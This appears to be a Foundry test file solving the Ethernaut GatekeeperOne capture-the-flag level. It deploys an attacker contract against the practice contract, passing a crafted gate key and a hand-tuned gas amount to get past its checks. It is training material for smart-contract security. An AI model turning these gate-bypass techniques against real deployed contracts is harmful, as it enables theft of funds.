pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOne.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testGatekeeperOneHack(bytes8 key, uint8 gas) public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        //@q could this have been fuzzed in a smart way?

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(hacker, hacker);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(
            payable(levelAddress)
        );
        //uint32(uint64(_gateKey)) has to be  //0x5bdf
        GateKeeperOneAttacker gatekeeperOneAttacker = new GateKeeperOneAttacker(
            ethernautGatekeeperOne
        );

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        uint256 revertNoGasFrom = 1081;
        uint256 noGasLeft = 8191;
        uint256 adjustedGas = 8191 - 103;
        //Out Of gas
        uint256 adjustedTest = 17490;
        uint256 doubleLimit = 16382;
        uint256 diff = 17490 - 16382; //1108
        adjustedTest = noGasLeft * 10 - 1108 + 2517 + 17 + 722;
        gatekeeperOneAttacker.attack{gas: adjustedTest}(0x0000000100005bdf);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
